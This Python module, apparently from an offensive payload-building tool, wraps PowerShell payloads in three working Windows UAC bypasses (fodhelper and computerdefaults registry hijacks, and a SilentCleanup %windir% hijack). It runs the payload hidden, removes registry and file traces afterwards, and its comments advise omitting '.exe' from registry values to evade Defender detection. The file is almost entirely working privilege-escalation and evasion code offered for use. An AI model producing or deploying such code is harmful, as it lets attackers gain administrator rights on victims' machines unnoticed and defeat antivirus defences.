"""PS1 UAC bypass wrapper pass — wraps payload in a UAC bypass technique.

Methods:
- fodhelper: Registry hijack via ms-settings\\Shell\\Open\\command + fodhelper.exe
- diskcleanup: Environment variable hijack via %windir% + SilentCleanup task
- computerdefaults: Registry hijack (same as fodhelper) + computerdefaults.exe

Key evasion note (from HTB): Defender detects .exe in the registry value.
Omitting .exe from the path avoids detection (Windows resolves it anyway).
"""

from __future__ import annotations

import secrets

from penumbra.types import PassConfig


def _rand_name() -> str:
    return "t" + secrets.token_hex(4)


def _gen_fodhelper(payload: str) -> str:
    """Generate FodHelper UAC bypass wrapper."""
    script_path = f"C:\\Windows\\Tasks\\{_rand_name()}.ps1"
    reg_path = "HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command"

    # Omit .exe from command value — Defender detects .exe in the registry value
    # Windows resolves "powershell" without .exe just fine
    return (
        f"$p = '{script_path}'\n"
        f"Set-Content -Path $p -Value @'\n"
        f"{payload}\n"
        f"'@\n"
        f'New-Item "{reg_path}" -Force | Out-Null\n'
        f'New-ItemProperty -Path "{reg_path}" '
        f'-Name "DelegateExecute" -Value "" -Force | Out-Null\n'
        f'Set-ItemProperty -Path "{reg_path}" '
        f'-Name "(Default)" -Value "powershell -ep bypass -File $p" -Force\n'
        f"Start-Process C:\\Windows\\System32\\fodhelper -WindowStyle Hidden\n"
        f"Start-Sleep 3\n"
        f'Remove-Item "HKCU:\\Software\\Classes\\ms-settings\\" -Recurse -Force\n'
        f"Remove-Item $p -Force\n"
    )


def _gen_diskcleanup(payload: str) -> str:
    """Generate DiskCleanup/SilentCleanup UAC bypass wrapper."""
    script_path = f"C:\\Windows\\Tasks\\{_rand_name()}.ps1"

    # Uses %windir% hijack — set windir to a command that runs our payload
    # The & REM at the end comments out the rest of the original path
    return (
        f"$p = '{script_path}'\n"
        f"Set-Content -Path $p -Value @'\n"
        f"{payload}\n"
        f"'@\n"
        f'Set-ItemProperty -Path "HKCU:\\Environment" -Name "windir" '
        f'-Value "cmd /K powershell -ep bypass -File $p & REM " -Force\n'
        f'schtasks /Run /TN "\\Microsoft\\Windows\\DiskCleanup\\SilentCleanup"\n'
        f"Start-Sleep 3\n"
        f'Remove-ItemProperty -Path "HKCU:\\Environment" -Name "windir" -Force\n'
        f"Remove-Item $p -Force\n"
    )


def _gen_computerdefaults(payload: str) -> str:
    """Generate ComputerDefaults UAC bypass wrapper."""
    script_path = f"C:\\Windows\\Tasks\\{_rand_name()}.ps1"
    reg_path = "HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command"

    # Same registry hijack as fodhelper, different auto-elevate binary
    return (
        f"$p = '{script_path}'\n"
        f"Set-Content -Path $p -Value @'\n"
        f"{payload}\n"
        f"'@\n"
        f'New-Item "{reg_path}" -Force | Out-Null\n'
        f'New-ItemProperty -Path "{reg_path}" '
        f'-Name "DelegateExecute" -Value "" -Force | Out-Null\n'
        f'Set-ItemProperty -Path "{reg_path}" '
        f'-Name "(Default)" -Value "powershell -ep bypass -File $p" -Force\n'
        f"Start-Process C:\\Windows\\System32\\computerdefaults -WindowStyle Hidden\n"
        f"Start-Sleep 3\n"
        f'Remove-Item "HKCU:\\Software\\Classes\\ms-settings\\" -Recurse -Force\n'
        f"Remove-Item $p -Force\n"
    )


_GENERATORS = {
    "fodhelper": _gen_fodhelper,
    "diskcleanup": _gen_diskcleanup,
    "computerdefaults": _gen_computerdefaults,
}


class UacBypassPass:
    """Wrap PS1 payload in a UAC bypass technique.

    Reads config.extra["uac_method"] to select which bypass.
    Runs AFTER encode pass — wraps the final obfuscated payload.
    """

    opt_in = True

    @property
    def name(self) -> str:
        return "uac"

    def apply(self, data: bytes, config: PassConfig) -> bytes:
        method = str(config.extra.get("uac_method", "fodhelper"))
        if method not in _GENERATORS:
            valid = ", ".join(_GENERATORS)
            raise ValueError(
                f"Unknown UAC method '{method}'. Valid: {valid}"
            )
        payload = data.decode("utf-8")
        result = _GENERATORS[method](payload)
        return result.encode("utf-8")
